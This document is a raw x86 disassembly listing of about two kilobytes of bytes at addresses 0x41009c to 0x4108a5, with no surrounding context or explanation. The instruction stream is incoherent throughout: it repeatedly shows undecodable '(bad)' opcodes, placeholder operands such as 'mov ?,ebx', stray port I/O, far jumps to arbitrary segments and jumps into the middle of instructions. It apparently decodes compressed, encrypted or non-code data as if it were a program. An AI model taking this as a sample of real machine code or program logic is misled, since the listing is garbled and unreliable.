  41009c:	mov    eax,0xb3489fab
  4100a1:	xlat   BYTE PTR ds:[ebx]
  4100a2:	mov    esp,0x1fda90d0
  4100a7:	pushf  
  4100a8:	stc    
  4100a9:	retf   
  4100aa:	inc    ebp
  4100ab:	int3   
  4100ac:	arpl   WORD PTR [edi-0x46ba173],si
  4100b2:	jg     0x4100b2
  4100b4:	fmul   DWORD PTR [ebp+0x7dfdbd8a]
  4100ba:	mov    ?,ebx
  4100bc:	ror    BYTE PTR [edi+eax*8-0x60999deb],cl
  4100c3:	dec    esp
  4100c4:	cmp    ecx,DWORD PTR ds:0x292344f3
  4100ca:	jnp    0x4100bb
  4100cc:	mov    bh,0xf4
  4100ce:	sti    
  4100cf:	and    esp,edi
  4100d1:	push   0xffffffa6
  4100d3:	or     cl,dl
  4100d5:	cmp    DWORD PTR [edi+0x2a],esi
  4100d8:	repnz (bad) 
  4100da:	jmp    0x8d7e:0xd7f59715
  4100e1:	test   al,0x3e
  4100e3:	pop    edi
  4100e4:	ret    
  4100e5:	inc    ebp
  4100e6:	neg    eax
  4100e8:	xor    al,0xd9
  4100ea:	aad    0xfb
  4100ec:	btr    DWORD PTR [esi],edi
  4100ef:	mov    WORD PTR [ecx-0x21],cs
  4100f2:	jmp    0x2046:0xee4dd74c
  4100f9:	clc    
  4100fa:	adc    DWORD PTR [esi-0x15],esi
  4100fd:	jg     0x41010b
  4100ff:	push   cs
  410100:	dec    esi
  410101:	inc    esi
  410102:	push   0xf73bf8dd
  410107:	push   ebx
  410108:	xchg   ecx,eax
  410109:	ja     0x4100ff
  41010b:	push   es
  41010c:	out    0xf6,eax
  41010e:	inc    edx
  41010f:	(bad)  [ebx-0x5b]
  410112:	test   BYTE PTR [edx+0x368464da],ch
  410118:	xchg   esp,eax
  410119:	ss pop edi
  41011b:	and    BYTE PTR [ecx],0xcb
  41011e:	mov    al,ds:0x4d5e26ed
  410123:	mov    dl,0x5e
  410125:	leave  
  410126:	adc    ecx,DWORD PTR ds:0xf1d2a55b
  41012c:	cs jne 0x410139
  41012f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410130:	stos   BYTE PTR es:[edi],al
  410131:	inc    edx
  410132:	ja     0x4100df
  410134:	or     BYTE PTR [eax+0x60],ch
  410137:	cmp    DWORD PTR [edx+0x78189732],esp
  41013d:	clc    
  41013e:	int3   
  41013f:	xchg   ebx,eax
  410140:	in     eax,dx
  410141:	out    dx,eax
  410142:	out    0x59,eax
  410144:	inc    eax
  410145:	enter  0x212e,0x40
  410149:	add    edx,DWORD PTR [eax-0x19]
  41014c:	shl    al,0x30
  41014f:	inc    eax
  410150:	lds    ecx,FWORD PTR [esp+edi*4-0xa848ae3]
  410157:	repz fiadd WORD PTR [ebp-0x4c]
  41015b:	jp     0x4101c5
  41015d:	lock inc esp
  41015f:	shl    DWORD PTR [ebx-0x706f2a32],0xdb
  410166:	xor    DWORD PTR [edx-0x21d583cd],edx
  41016c:	sbb    eax,0x5fb8d451
  410171:	retf   
  410172:	xchg   ebp,eax
  410173:	mov    edx,0x1e01b7c5
  410178:	push   cs
  410179:	nop
  41017a:	dec    eax
  41017b:	mov    ch,0xdd
  41017d:	fcomp  QWORD PTR [ebx+0x4b3f7841]
  410183:	sbb    dh,al
  410185:	mov    edx,0x66d6ea29
  41018a:	jmp    0x465c5008
  41018f:	add    DWORD PTR [edx+0x68],0x0
  410193:	sub    BYTE PTR [edx],ch
  410195:	sahf   
  410196:	and    eax,0x27db4e72
  41019b:	or     al,0x4b
  41019d:	pusha  
  41019e:	jmp    0xc1ab60f0
  4101a3:	sub    ah,BYTE PTR [edi]
  4101a5:	sti    
  4101a6:	jecxz  0x4101c8
  4101a8:	cmp    eax,0x694c6bd8
  4101ad:	and    edx,DWORD PTR [esi]
  4101af:	lds    esp,FWORD PTR [ecx-0x6f]
  4101b2:	and    al,0x56
  4101b4:	test   DWORD PTR [ebp-0xa],ebp
  4101b7:	repz in eax,dx
  4101b9:	inc    eax
  4101ba:	(bad)  
  4101bb:	in     al,0xd8
  4101bd:	ja     0x4101d8
  4101bf:	nop
  4101c0:	jno    0x41019f
  4101c2:	jmp    0x410153
  4101c4:	push   esp
  4101c5:	pop    eax
  4101c6:	or     DWORD PTR [ebp+0x3aac2125],esp
  4101cc:	cmc    
  4101cd:	addr16 jae 0x4101eb
  4101d0:	sub    al,0x3b
  4101d2:	stos   BYTE PTR es:[edi],al
  4101d3:	data16 xor ch,cl
  4101d6:	(bad)  
  4101d7:	pop    edi
  4101d8:	sbb    DWORD PTR [edi+ebx*2-0x2],edx
  4101dc:	mov    gs,WORD PTR [esi]
  4101de:	cs in  eax,0xee
  4101e1:	ret    0xeb47
  4101e4:	mov    edx,0x9ce3d932
  4101e9:	cmc    
  4101ea:	loop   0x4101e0
  4101ec:	fs scas eax,DWORD PTR es:[edi]
  4101ee:	mov    ah,BYTE PTR [eax-0x35]
  4101f1:	enter  0xe95c,0x72
  4101f5:	cdq    
  4101f6:	adc    ch,cl
  4101f8:	add    dl,BYTE PTR [eax+0x366f1cc1]
  4101fe:	xchg   ebp,eax
  4101ff:	(bad)  
  410201:	outs   dx,BYTE PTR ds:[esi]
  410202:	ja     0x41021d
  410204:	in     al,0xd2
  410206:	xchg   edi,eax
  410207:	xor    bl,BYTE PTR ds:0x150bb56d
  41020d:	or     bl,cl
  41020f:	aaa    
  410210:	leave  
  410211:	mov    ebx,0xd61c7aa2
  410216:	(bad)  [edi-0x7c4dcf2b]
  41021c:	mov    edi,0x84562708
  410221:	iret   
  410222:	jg     0x410295
  410224:	cmp    eax,0x58942c38
  410229:	in     eax,0xe6
  41022b:	mov    ds:0x2709d0c7,al
  410230:	pop    eax
  410231:	pop    es
  410232:	push   esp
  410233:	in     al,dx
  410234:	cmova  edi,DWORD PTR ds:0x62d37e9d
  41023b:	jecxz  0x410275
  41023d:	jmp    0x41029a
  41023f:	pop    esi
  410240:	xchg   esp,eax
  410241:	lahf   
  410242:	cmp    edx,0xffffffe6
  410245:	pop    esi
  410246:	ss jnp 0x4101cc
  410249:	and    eax,0x159c4f3d
  41024e:	rol    DWORD PTR [edx+0x21dc5b8e],cl
  410254:	mov    bl,0x54
  410256:	icebp  
  410257:	ds iret 
  410259:	pop    ebx
  41025a:	inc    esi
  41025b:	loopne 0x4102dc
  41025d:	(bad)  
  41025e:	ja     0x41029f
  410260:	push   ss
  410261:	lock pop eax
  410263:	push   es
  410264:	aad    0x22
  410266:	pop    esi
  410267:	jnp    0x4101f0
  410269:	scas   eax,DWORD PTR es:[edi]
  41026a:	add    al,0x37
  41026c:	push   ebp
  41026d:	loopne 0x410266
  41026f:	mov    eax,ds:0x2ebfc98
  410274:	call   DWORD PTR [ecx-0x67c8f4e3]
  41027a:	or     BYTE PTR [edx],bl
  41027c:	ret    0x13b2
  41027f:	ins    BYTE PTR es:[edi],dx
  410280:	scas   al,BYTE PTR es:[edi]
  410281:	sub    DWORD PTR [ecx+ecx*4+0x59e315ca],eax
  410288:	pop    ss
  410289:	sahf   
  41028a:	js     0x410301
  41028c:	call   0x5cf7:0xe063b659
  410293:	scas   al,BYTE PTR es:[edi]
  410294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410295:	push   esp
  410296:	bound  ecx,QWORD PTR [eax-0x247d453f]
  41029c:	push   esi
  41029d:	and    dh,BYTE PTR [esi+0x7aeab97b]
  4102a3:	gs push eax
  4102a5:	(bad)
  4102a9:	dec    edx
  4102aa:	cmp    al,0xac
  4102ac:	xchg   ebp,eax
  4102ad:	shl    BYTE PTR [esi+0x7a],cl
  4102b0:	push   edi
  4102b1:	jmp    0xf0a6:0x6a6dfa72
  4102b8:	or     DWORD PTR [esi-0x3f80dcb5],ebp
  4102be:	sub    ebx,DWORD PTR [esi-0x5f]
  4102c1:	push   esi
  4102c2:	outs   dx,DWORD PTR ds:[esi]
  4102c3:	imul   ebp,DWORD PTR [edi+0x3d],0x1d9307f1
  4102ca:	sbb    al,0x32
  4102cc:	(bad)  
  4102cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102ce:	xchg   ebx,eax
  4102cf:	test   edx,ebx
  4102d1:	sub    bl,al
  4102d3:	imul   esp,DWORD PTR [ebx],0x7d368ffb
  4102d9:	in     eax,dx
  4102da:	add    eax,0xbefe43a2
  4102df:	inc    eax
  4102e0:	mov    BYTE PTR [edi+ecx*2],bh
  4102e3:	mov    dl,0x3e
  4102e5:	js     0x4102f8
  4102e7:	jmp    0x410282
  4102e9:	mov    bl,0xe7
  4102eb:	sbb    ch,ch
  4102ed:	pop    edi
  4102ee:	mov    cl,0xd
  4102f0:	mov    al,0x57
  4102f2:	shl    BYTE PTR [ecx-0x754b69f2],cl
  4102f8:	mov    edx,0xa76c92b0
  4102fd:	mov    ds:0x4d574479,al
  410302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410304:	inc    ebp
  410305:	(bad)  
  410306:	push   0x5d7ebc61
  41030b:	push   es
  41030c:	loope  0x4102af
  41030e:	test   al,0x5b
  410310:	pop    esp
  410311:	imul   ebp,DWORD PTR [ebx-0x20],0x13b6f142
  410318:	mov    esp,0x794f28b8
  41031d:	mov    esi,0xea7125d1
  410322:	pop    ss
  410323:	inc    edx
  410324:	cmc    
  410325:	and    eax,0xd6077df2
  41032a:	dec    esi
  41032b:	jmp    0xe0b8ddb2
  410330:	in     eax,dx
  410331:	sahf   
  410332:	pop    edi
  410333:	inc    ecx
  410334:	cmc    
  410335:	cmp    eax,0xbd3cb488
  41033a:	xor    DWORD PTR [esi+0x7f],ebp
  41033d:	dec    edx
  41033e:	jmp    0xd443c199
  410343:	fstp   QWORD PTR [esi]
  410345:	or     DWORD PTR [ecx+0x21ba6d6c],edx
  41034b:	lahf   
  41034c:	retf   
  41034d:	and    al,0xa4
  41034f:	pop    edi
  410350:	ja     0x410381
  410352:	pop    esp
  410353:	ficom  WORD PTR ds:0x76c25398
  410359:	(bad)  
  41035b:	outs   dx,DWORD PTR ds:[esi]
  41035c:	ret    0x7411
  41035f:	(bad)  
  410360:	add    eax,0xf390c0c8
  410365:	mov    bh,0x80
  410367:	inc    ebp
  410368:	test   DWORD PTR cs:[edi+0x75],edi
  41036c:	adc    DWORD PTR [eax-0x5b],0x7d18ce62
  410373:	inc    ecx
  410374:	mov    WORD PTR [esp+ebp*8-0x29c3eb67],gs
  41037b:	lds    ebx,FWORD PTR ds:0x400898a8
  410381:	inc    ebx
  410382:	iret   
  410383:	aam    0xca
  410385:	arpl   si,dx
  410387:	rcr    DWORD PTR [edx-0x127a949b],0x61
  41038e:	aaa    
  41038f:	enter  0x95da,0x46
  410393:	jns    0x410326
  410395:	pop    ds
  410396:	push   cs
  410397:	neg    BYTE PTR [ecx]
  410399:	xchg   DWORD PTR [edx+ebx*1+0x5b],esp
  41039d:	xchg   edx,eax
  41039e:	adc    DWORD PTR [ecx],0xec468f17
  4103a4:	lods   eax,DWORD PTR ds:[esi]
  4103a5:	sub    eax,0x81e1629
  4103aa:	mov    WORD PTR [ebp-0x6d947081],es
  4103b0:	add    dh,0x1
  4103b3:	add    ah,BYTE PTR ds:0xb505a65b
  4103b9:	jle    0x4103f1
  4103bb:	sahf   
  4103bc:	les    ecx,FWORD PTR [eax+ebx*4]
  4103bf:	sahf   
  4103c0:	loopne 0x410350
  4103c2:	fidivr DWORD PTR [ecx]
  4103c4:	or     eax,0x3cf585ab
  4103c9:	(bad)  
  4103ca:	fst    DWORD PTR [ebx+0x28260013]
  4103d0:	pop    eax
  4103d1:	dec    ebx
  4103d2:	into   
  4103d3:	cs ss inc ecx
  4103d6:	imul   eax,DWORD PTR [esi],0x77589fef
  4103dc:	int    0xd2
  4103de:	dec    ebx
  4103df:	loop   0x41041e
  4103e1:	xor    eax,0xdd5484b8
  4103e6:	test   eax,0x84339f1a
  4103eb:	mov    edx,0xf8ccfab6
  4103f0:	ret    
  4103f1:	aad    0xf7
  4103f3:	jg     0x4103f3
  4103f5:	sbb    al,0x46
  4103f7:	cmc    
  4103f8:	and    esi,DWORD PTR [ebx+0x22]
  4103fb:	js     0x4103cd
  4103fd:	call   0x55ec:0x1a647c
  410404:	push   edx
  410405:	xor    DWORD PTR [esi-0x61af53f8],eax
  41040b:	stc    
  41040c:	dec    esi
  41040d:	push   ecx
  41040e:	push   esi
  41040f:	mov    eax,ds:0x5c491612
  410414:	xchg   bh,ah
  410416:	leave  
  410417:	push   ebp
  410418:	out    0x78,al
  41041a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041b:	jmp    0x4655a588
  410420:	ror    dl,0x54
  410423:	sub    ebp,DWORD PTR [edi+0x3f494544]
  410429:	and    al,0x87
  41042b:	push   ecx
  41042c:	mov    ch,0x26
  41042e:	bound  esi,QWORD PTR [ecx-0x46]
  410431:	pop    ecx
  410432:	mov    cl,0x43
  410434:	fnstcw WORD PTR [ecx]
  410436:	out    dx,eax
  410437:	retf   0xdc06
  41043a:	or     al,0xe9
  41043c:	xchg   DWORD PTR [esi-0x2ebe549c],eax
  410442:	lahf   
  410443:	clc    
  410444:	out    dx,al
  410445:	hlt    
  410446:	mov    ebp,0x1f9ba3d7
  41044b:	inc    eax
  41044c:	sub    eax,0x68c11af4
  410451:	int3   
  410452:	pop    edi
  410453:	(bad)  
  410454:	mov    dl,0x80
  410456:	jnp    0x410491
  410458:	sub    BYTE PTR [ebx-0x73c6d807],bh
  41045e:	or     DWORD PTR [edx],eax
  410460:	call   0xe69dd438
  410465:	xor    BYTE PTR [edi],cl
  410467:	inc    ebx
  410468:	add    edi,esp
  41046a:	mov    eax,0x6d3493b1
  41046f:	xor    eax,0x78ba7b12
  410474:	pushf  
  410475:	mov    ?,esi
  410477:	rcr    BYTE PTR [ecx-0x5c94ecd6],0x33
  41047e:	call   0x7ba624fc
  410483:	pop    ds
  410484:	add    eax,DWORD PTR [eax-0x16d52e27]
  41048a:	loopne 0x4104b4
  41048c:	xor    esp,eax
  41048e:	xchg   esp,eax
  41048f:	sti    
  410490:	mov    eax,0xec619c3b
  410495:	cmp    al,BYTE PTR [ebx-0x14]
  410498:	pop    ss
  410499:	fistp  WORD PTR [esp+ecx*1-0x16]
  41049d:	rcr    BYTE PTR [esi+ebx*4+0x26ff950f],1
  4104a4:	xchg   BYTE PTR [edx],bl
  4104a6:	rcr    BYTE PTR [ecx-0x32485585],1
  4104ac:	xchg   esp,eax
  4104ad:	and    DWORD PTR [esi+0x2077fdc1],esp
  4104b3:	jge    0x4104ae
  4104b5:	stc    
  4104b6:	cld    
  4104b7:	repnz scas al,BYTE PTR es:[edi]
  4104b9:	shl    bh,cl
  4104bb:	ins    BYTE PTR es:[edi],dx
  4104bc:	xchg   esp,eax
  4104bd:	jns    0x41048a
  4104bf:	iret   
  4104c0:	pop    ds
  4104c1:	sub    dl,BYTE PTR [esi]
  4104c3:	or     eax,0x826cf280
  4104c8:	cmp    DWORD PTR [eax-0x3b],0x75
  4104cc:	es sbb cl,al
  4104cf:	loop   0x4104b2
  4104d1:	ins    DWORD PTR es:[edi],dx
  4104d2:	mov    ebp,0xe3167523
  4104d7:	push   cs
  4104d8:	inc    ebx
  4104d9:	pusha  
  4104da:	mov    eax,ds:0x268792cf
  4104df:	stos   BYTE PTR es:[edi],al
  4104e0:	in     al,dx
  4104e1:	xor    eax,0x133fd55d
  4104e6:	cmp    DWORD PTR es:[esi+ebx*4-0x4182332f],esi
  4104ee:	or     BYTE PTR [edi-0x65],dh
  4104f1:	jge    0x410538
  4104f3:	xchg   BYTE PTR [ebp+0x39c25a09],bl
  4104f9:	push   ss
  4104fa:	ret    
  4104fb:	aad    0x2d
  4104fd:	jmp    0x4104e8
  4104ff:	cmp    dl,BYTE PTR [ebp+0xeb762c4]
  410505:	mov    DWORD PTR [ecx+0x4f],ebx
  410508:	gs loop 0x4104c2
  41050b:	xlat   BYTE PTR ds:[ebx]
  41050c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41050d:	add    DWORD PTR [ebp+0x92a2b8],edx
  410513:	pop    edx
  410514:	sbb    DWORD PTR ds:0xcc4d5b24,esi
  41051a:	mov    ecx,0x83ee2ca9
  41051f:	mov    eax,0x76675ba8
  410524:	add    BYTE PTR [edx],bl
  410526:	mov    cl,al
  410528:	jo     0x410566
  41052a:	push   es
  41052b:	mov    ebp,DWORD PTR [edx]
  41052d:	push   edi
  41052e:	sbb    cl,BYTE PTR [edi]
  410530:	pop    esi
  410531:	sti    
  410532:	xchg   ebp,eax
  410533:	cmp    ebx,ebx
  410535:	or     eax,DWORD PTR [esi]
  410537:	pop    edx
  410538:	ins    BYTE PTR es:[edi],dx
  410539:	jns    0x4104e5
  41053b:	adc    al,0xfd
  41053d:	es mov ch,0x75
  410540:	xchg   esi,eax
  410541:	loope  0x4104e7
  410543:	jne    0x410556
  410545:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410546:	lods   al,BYTE PTR ds:[esi]
  410547:	lods   eax,DWORD PTR ds:[esi]
  410548:	push   ds
  410549:	cwde   
  41054a:	dec    edi
  41054b:	xlat   BYTE PTR ds:[ebx]
  41054c:	sub    eax,0xe4cd0565
  410551:	(bad)  
  410552:	cmp    DWORD PTR [edi],ebx
  410554:	fcomp  DWORD PTR [esp+esi*2+0x41]
  410558:	mov    ch,0x5c
  41055a:	xchg   esp,eax
  41055b:	imul   ebx,DWORD PTR [edx+esi*1],0x5b
  41055f:	sbb    al,0x0
  410561:	popa   
  410562:	dec    ebp
  410563:	and    al,0xf2
  410565:	or     al,dh
  410567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410568:	mov    esp,0x54d575bf
  41056d:	push   DWORD PTR ds:0xe34ab2a5
  410573:	sub    BYTE PTR [ecx-0x13aa58f3],dl
  410579:	push   eax
  41057a:	jns    0x410543
  41057c:	cmp    BYTE PTR [esi+ecx*8+0x50],bl
  410580:	retf   0x750c
  410583:	mov    bl,0xfe
  410585:	mov    ebp,0x1df50011
  41058a:	(bad)  
  41058b:	fcmovnu st,st(4)
  41058d:	jb     0x41052a
  41058f:	push   es
  410590:	mov    BYTE PTR [esp+eiz*8-0x78bd5bf1],ch
  410597:	inc    esi
  410598:	push   esp
  410599:	jne    0x4105ea
  41059b:	mov    ah,0x45
  41059d:	js     0x410570
  41059f:	shl    DWORD PTR [edi-0x31b51551],0x46
  4105a6:	das    
  4105a7:	sub    DWORD PTR [ebp-0x10fd053f],edx
  4105ad:	inc    edi
  4105ae:	lea    esp,[esi]
  4105b0:	pop    ss
  4105b1:	sub    al,BYTE PTR [ecx+0x29]
  4105b4:	pop    ecx
  4105b5:	jmp    0x968f9554
  4105ba:	mov    ah,0xfc
  4105bc:	jae    0x4105f3
  4105be:	push   ebx
  4105bf:	adc    dl,BYTE PTR [ebx+0x4fc60ae7]
  4105c5:	test   eax,0x32d19c93
  4105ca:	sbb    DWORD PTR ds:0x6689c913,ebx
  4105d0:	pushf  
  4105d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105d2:	cmp    al,0x97
  4105d4:	das    
  4105d5:	dec    ecx
  4105d6:	push   0x52
  4105d8:	dec    eax
  4105d9:	repnz mov dl,0xe8
  4105dc:	xlat   BYTE PTR ds:[ebx]
  4105dd:	cmp    al,0x6b
  4105df:	and    al,0xd4
  4105e1:	das    
  4105e2:	push   ebx
  4105e3:	adc    al,0x64
  4105e5:	inc    ebx
  4105e6:	gs push ds
  4105e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105e9:	in     al,dx
  4105ea:	xor    BYTE PTR [esi+0x11],dh
  4105ed:	jne    0x410600
  4105ef:	sti    
  4105f0:	aaa    
  4105f1:	jbe    0x41060e
  4105f3:	cmp    ecx,ebx
  4105f5:	xchg   ebx,eax
  4105f6:	addr16 jns 0x4105d9
  4105f9:	retf   
  4105fa:	in     eax,0x9f
  4105fc:	mov    ds:0xdeaf07c4,al
  410601:	inc    ecx
  410602:	lods   al,BYTE PTR ds:[esi]
  410603:	inc    edx
  410604:	jns    0x4105e0
  410606:	(bad)  
  410608:	or     ebp,DWORD PTR ds:0xbd2907b6
  41060e:	std    
  41060f:	mov    esp,0xbd8f4606
  410614:	and    ebp,DWORD PTR [ebp-0x4f]
  410617:	inc    ebp
  410618:	out    dx,al
  410619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41061a:	pop    edx
  41061b:	inc    edi
  41061c:	xchg   ebx,eax
  41061d:	push   ds
  41061e:	xor    al,0xde
  410620:	hlt    
  410621:	dec    eax
  410622:	adc    DWORD PTR ds:0xbe6306f9,edi
  410628:	shr    edx,0x3e
  41062b:	sub    BYTE PTR [edi-0x6f],al
  41062e:	outs   dx,DWORD PTR ds:[esi]
  41062f:	test   BYTE PTR [edx+esi*8-0x5c0d8d9],ch
  410636:	ins    BYTE PTR es:[edi],dx
  410637:	hlt    
  410638:	mov    ebx,0xf93d145a
  41063d:	(bad)  [eax+0x6a]
  410640:	xchg   cl,cl
  410642:	(bad)  
  410643:	push   0xac28c6d1
  410648:	popf   
  410649:	mov    ebx,0xfa9b4204
  41064e:	pop    esp
  41064f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410650:	(bad)  
  410651:	mov    esp,0x280ad7ef
  410656:	mov    edx,0x6317d724
  41065b:	sub    DWORD PTR [edx-0x4d719a30],esp
  410661:	repnz imul BYTE PTR [edi+0x32e8e377]
  410668:	dec    ebx
  410669:	fdivr  QWORD PTR [eax]
  41066b:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41066d:	dec    esp
  41066e:	sub    BYTE PTR [ebx],dl
  410670:	mov    ebx,0x82a6adbe
  410675:	xchg   ebp,eax
  410676:	pop    ebp
  410677:	in     eax,dx
  410678:	mov    eax,0x8e25ebb4
  41067d:	push   esi
  41067e:	cwde   
  41067f:	sbb    BYTE PTR [eax+0x58a66e92],ch
  410685:	scas   al,BYTE PTR es:[edi]
  410686:	jmp    0x335c:0xce7dac5f
  41068d:	push   edi
  41068e:	out    dx,al
  41068f:	xor    eax,0xdd9465e5
  410694:	xlat   BYTE PTR ds:[ebx]
  410695:	push   ds
  410696:	enter  0x8ca3,0x7c
  41069a:	repnz in eax,dx
  41069c:	shl    BYTE PTR [eax],cl
  41069e:	sbb    eax,0xb4260169
  4106a3:	fsub   st(7),st
  4106a5:	(bad)  
  4106a6:	call   0x6d780367
  4106ab:	or     BYTE PTR [edx+edx*8-0x5f],0x78
  4106b0:	sbb    DWORD PTR [edi+0x20],edi
  4106b3:	mov    esp,0x6e71e5b8
  4106b8:	ja     0x41064d
  4106ba:	pop    edx
  4106bb:	(bad)  
  4106bc:	fst    DWORD PTR [edi-0x40]
  4106bf:	fistp  QWORD PTR [edi-0x5ffed88]
  4106c5:	ins    BYTE PTR es:[edi],dx
  4106c6:	sub    eax,0xe0181bbf
  4106cb:	rcl    DWORD PTR [esi-0x77],cl
  4106ce:	jbe    0x4106ab
  4106d0:	sahf   
  4106d1:	pop    ds
  4106d2:	and    edi,edi
  4106d4:	(bad)  
  4106d7:	retf   
  4106d8:	ins    BYTE PTR es:[edi],dx
  4106d9:	push   ecx
  4106da:	rcr    BYTE PTR [ebp+0x16136a9e],0x1
  4106e1:	push   ebx
  4106e2:	mov    esi,0x4dc79a63
  4106e7:	sub    DWORD PTR [eax-0x674d6921],0xd9d8fafd
  4106f1:	mov    edi,0xc80919ce
  4106f6:	sub    esi,DWORD PTR [ecx+0x60]
  4106f9:	out    dx,al
  4106fa:	test   BYTE PTR [edi],dl
  4106fc:	mov    ds:0xe9a788f8,eax
  410701:	mov    edx,0x5073220a
  410706:	inc    ecx
  410707:	sub    eax,0x3009c722
  41070c:	sbb    DWORD PTR ds:0x92557a96,0x40
  410713:	inc    edi
  410714:	mov    eax,ds:0xfad39e7a
  410719:	cmp    al,0x69
  41071b:	aas    
  41071c:	xor    al,0x48
  41071e:	fstp   TBYTE PTR [edi-0x2d9f4451]
  410724:	retf   
  410725:	sahf   
  410726:	repz test BYTE PTR [ebx-0x472af134],al
  41072d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41072e:	inc    eax
  41072f:	in     eax,0xa6
  410731:	sbb    bl,ch
  410733:	push   ebx
  410735:	jns    0x410755
  410737:	add    BYTE PTR [ecx-0xa],dh
  41073a:	inc    edi
  41073b:	pop    edx
  41073c:	mov    dl,0x93
  41073e:	fldcw  WORD PTR [edx-0x77]
  410741:	loope  0x4106ee
  410743:	gs mov esp,0xac10393b
  410749:	jl     0x4107ba
  41074b:	push   ss
  41074c:	popa   
  41074d:	mov    ds:0x3c657c02,eax
  410752:	rcl    BYTE PTR [ebx],0x6c
  410755:	shl    BYTE PTR [ebp-0xc12e208],0xb1
  41075c:	imul   eax,DWORD PTR [edi+0x50],0xa5f61f89
  410763:	sub    al,0x0
  410765:	cmc    
  410766:	add    BYTE PTR [ecx+0x95568f4],ah
  41076c:	and    DWORD PTR [ebx+edx*8+0x6f],esi
  410770:	cmp    ecx,esi
  410772:	inc    esp
  410773:	pushf  
  410774:	xchg   esp,eax
  410775:	mov    edi,0x61bd7174
  41077a:	and    al,0xf9
  41077c:	sti    
  41077d:	mov    bh,0x84
  41077f:	loopne 0x4107c9
  410781:	adc    ecx,ebx
  410783:	jno    0x4107ff
  410785:	hlt    
  410786:	sub    esp,DWORD PTR [esi+0x4edb22b0]
  41078c:	xchg   ebp,eax
  41078d:	and    dl,BYTE PTR [ecx-0x3fef2f07]
  410793:	adc    eax,0x5d106213
  410798:	xor    ebx,DWORD PTR [ebx+edx*8]
  41079b:	and    ch,BYTE PTR [edx+0x5e]
  41079e:	jo     0x41079a
  4107a0:	lock xchg esi,eax
  4107a2:	sbb    BYTE PTR ds:0xa3dba284,bh
  4107a8:	(bad)  
  4107a9:	js     0x41080d
  4107ab:	imul   ecx,eax,0x76
  4107ae:	jl     0x4107eb
  4107b0:	hlt    
  4107b1:	mov    ds:0xc7c5988,al
  4107b6:	in     eax,0x69
  4107b8:	add    ebx,DWORD PTR [esi-0x2f]
  4107bb:	mov    ds:0xf2c0a078,al
  4107c0:	mov    WORD PTR [ebx-0x60be885f],gs
  4107c6:	mov    bh,0x27
  4107c8:	out    0x2e,al
  4107ca:	inc    esi
  4107cb:	pop    ecx
  4107cc:	and    esp,DWORD PTR [eax-0x76]
  4107cf:	ss or  ah,ah
  4107d2:	sub    eax,0x510842a1
  4107d7:	es add eax,esp
  4107da:	pusha  
  4107db:	je     0x41083b
  4107dd:	dec    edi
  4107de:	push   edx
  4107df:	xchg   DWORD PTR [edx],esi
  4107e1:	cld    
  4107e2:	and    eax,eax
  4107e4:	jb     0x410851
  4107e6:	aam    0x86
  4107e8:	std    
  4107e9:	icebp  
  4107ea:	jae    0x410807
  4107ec:	inc    esi
  4107ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ef:	mov    ch,0x70
  4107f1:	icebp  
  4107f2:	test   al,dh
  4107f4:	add    al,0xf7
  4107f6:	ds push edx
  4107f8:	mul    BYTE PTR [esi+0x7e]
  4107fb:	in     al,0x95
  4107fd:	mov    gs,esp
  4107ff:	and    DWORD PTR [ebx],0xf97b6194
  410805:	push   esp
  410806:	popa   
  410807:	jle    0x410837
  410809:	lock dec eax
  41080b:	out    dx,al
  41080c:	push   0xffffffaa
  41080e:	outs   dx,DWORD PTR ds:[esi]
  41080f:	xor    al,0x7
  410811:	test   eax,0x5c424571
  410816:	imul   edi,ebp,0xffffffe9
  410819:	pop    ecx
  41081a:	mov    ds:0xe7114ed2,eax
  41081f:	jns    0x410876
  410821:	pop    ecx
  410822:	mov    ebp,0x6ab9e39b
  410827:	pop    ecx
  410828:	lock in eax,0x52
  41082b:	outs   dx,BYTE PTR ds:[esi]
  41082c:	mov    dh,0x8f
  41082e:	sbb    ebx,DWORD PTR [eax]
  410830:	and    al,0xfe
  410832:	or     al,0x35
  410834:	xchg   edi,eax
  410835:	js     0x410857
  410837:	or     dh,ch
  410839:	aaa    
  41083a:	cmp    DWORD PTR [ecx-0x20],0xf0510533
  410841:	mov    eax,ds:0x7f838282
  410846:	cwde   
  410847:	leave  
  410848:	sbb    eax,0xf62c929
  41084d:	outs   dx,DWORD PTR ds:[esi]
  41084e:	cli    
  41084f:	dec    esi
  410850:	dec    edx
  410851:	je     0x4107f0
  410853:	outs   dx,BYTE PTR ds:[esi]
  410854:	pushaw 
  410856:	popa   
  410857:	xor    BYTE PTR [edi-0x5e760a56],0x43
  41085e:	inc    ecx
  41085f:	and    eax,0xf232260
  410864:	or     DWORD PTR [edx+0x27],ecx
  410867:	mov    bl,0xf2
  410869:	repz out 0xe7,eax
  41086c:	xor    esp,DWORD PTR [esi-0x7414d562]
  410872:	sub    ah,BYTE PTR [ebx]
  410874:	adc    ah,BYTE PTR ds:0x50a99554
  41087a:	xor    al,ah
  41087c:	xchg   edx,edi
  41087e:	and    al,bh
  410880:	sbb    al,al
  410882:	xrelease xchg BYTE PTR [ebp+0x1c65ae63],dl
  410889:	inc    ebx
  41088b:	xchg   eax,edi
  41088d:	dec    ebx
  41088e:	xchg   BYTE PTR [ebp+0x40],ch
  410891:	push   0xa98fd3d3
  410896:	dec    eax
  410897:	fstp   st(5)
  410899:	sbb    al,0x51
  41089b:	xchg   BYTE PTR [ebp+0x2b],ah
  41089e:	sar    ebp,0x29
  4108a1:	dec    DWORD PTR [ebx]
  4108a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a4:	aaa    
  4108a5:	cmp    eax,0xc54209b3
